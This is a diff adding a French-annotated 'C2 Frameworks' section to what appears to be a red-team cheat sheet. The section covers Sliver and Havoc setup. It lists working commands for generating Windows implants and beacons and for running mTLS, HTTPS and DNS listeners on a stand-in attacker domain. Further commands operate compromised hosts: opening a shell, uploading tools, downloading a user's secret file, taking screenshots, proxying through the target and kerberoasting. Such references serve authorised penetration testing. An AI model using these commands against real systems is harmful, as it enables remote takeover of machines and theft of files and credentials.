@@ -408,6 +408,62 @@ Get-ForestTrust
 
 ---
 
+## C2 Frameworks
+
+### Sliver
+
+```bash
+# Installation
+curl https://sliver.sh/install | sudo bash
+
+# Démarrer le serveur
+sliver-server
+
+# Génération d'implants
+sliver > generate --mtls 192.168.56.100 --os windows --arch amd64 --save /tmp/
+sliver > generate beacon --mtls 192.168.56.100 --os windows --seconds 60 --jitter 30
+
+# Listeners
+sliver > mtls --lhost 0.0.0.0 --lport 8888
+sliver > https --domain legit-domain.com --lport 443
+sliver > dns --domains c2.attacker.com
+
+# Post-exploitation
+sliver > sessions
+sliver > use [SESSION_ID]
+sliver (TARGET) > whoami
+sliver (TARGET) > shell
+sliver (TARGET) > upload /tmp/tool.exe C:\\temp\\tool.exe
+sliver (TARGET) > download C:\\Users\\admin\\secret.txt
+sliver (TARGET) > screenshot
+sliver (TARGET) > socks5 start
+
+# Extensions
+sliver > armory install rubeus
+sliver (TARGET) > rubeus kerberoast
+```
+
+### Havoc
+
+```bash
+# Build
+git clone https://github.com/HavocFramework/Havoc.git
+cd Havoc/teamserver && go build -o havoc-teamserver cmd/server/main.go
+cd ../client && make
+
+# Démarrer
+./havoc-teamserver --profile profiles/havoc.yaotl
+./havoc-client
+
+# Interface graphique pour:
+# - Payload generation (Demon agent)
+# - Listener configuration
+# - Post-exploitation modules
+# - BOF execution
+```
+
+---
+
 ## Hashcat Modes
 
 | Mode | Hash Type |
